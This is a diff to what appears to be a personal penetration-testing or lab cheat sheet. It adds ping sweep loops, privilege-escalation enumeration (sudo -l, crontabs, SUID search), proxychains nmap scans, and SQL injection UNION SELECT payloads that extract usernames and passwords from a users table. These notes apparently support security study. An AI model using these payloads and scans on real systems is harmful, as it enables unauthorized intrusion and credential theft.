@@ -748,7 +748,7 @@ anotherpassword4THEages
 
 DRYRUN REVIEW
 For Linux
- for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &) ;done
+ for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &); done
 
 For Windows
 for /L %i in (1,1,255) do @ping -n 1 -w 200 192.168.1.%i > nul && echo 192.168.1.%i is up
@@ -799,16 +799,31 @@ hit F12 for developer tools
 - change to raw add a questionmark after php, copy and paste the raw text for passwords
 - go to cyberchef for password decryption ROT13 or Base64 
 
+ENUMERATE TARGET MACHINE THROUGH COMMAND LINE
+On First Target Machine run ping sweep
+- do bash on terminal then run;            (reason being need to have bash in order to run else will give error)
+   for i in {1..254} ;do (ping -c 1 192.168.1.$i | grep "bytes from" &); done
 
+sudo -l
+cat /etc/crontabs (be mindful of the directory if run-parts is in crontab)
+find / -type f -perm /4000 -ls 2>/dev/null
+-4000 is SUID Users 
+-2000 is SGID
+-6000 is SUID or SGID 
 
+SET UP DYNAMIC TUNNELS FOR SCANNING ON NEWLY FOUND IPs
+proxychains nmap -v -sT -Pn -T4 -sV <found IPs> -p1-10000
+proxychains nmap -v -sT -Pn -T4 -sV --script=http-enum.nse <found IPs> -p80
 
+SET UP A WEB TUNNEL TO THE NEW PORT 80 WEBSITE
 
-
-
-
-
-
-
+SQL injection
+product=2 OR 1=1(;) add the semi-colon or not to see if the sql can give more information then intended
+UNION SELECT 1,table_name,3 FROM information_schema.tables (add more columns in case there will be more than 3 columns EX: ( 1,table_name,3,4,5 )
+UNION SELECT 1,table_schema,table_name FROM information_schema.tables
+UNION SELECT table_name,1,column_name FROM information_schema.columns
+UNION SELECT table_schema,column_name,table_name FROM information_schema.columns
+EX: pick.php?/product=7 UNION SELECT userid,username,passwd FROM users
 
 
 
